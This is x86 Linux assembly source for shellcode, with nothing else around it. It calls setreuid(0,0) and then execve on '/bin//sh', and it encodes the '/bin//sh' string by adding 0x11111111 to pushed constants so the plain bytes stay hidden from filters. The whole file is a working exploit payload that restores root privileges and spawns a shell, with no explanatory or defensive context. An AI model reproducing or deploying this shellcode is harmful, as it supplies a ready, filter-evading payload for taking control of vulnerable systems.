global _start


section .text

_start:

;push byte 0x46
;pop eax
xor ebx,ebx
xor ecx,ecx
mul ecx
mov al, 0x46
int 0x80
;xor edx,edx
push byte +0xb
pop eax
push edx
mov esi, 0x57621e1e
add esi, 0x11111111
push esi
mov esi, 0x5d58511e
add esi, 0x11111111
push esi
mov ebx,esp
push edx
push ebx
mov ecx,esp
int 0x80

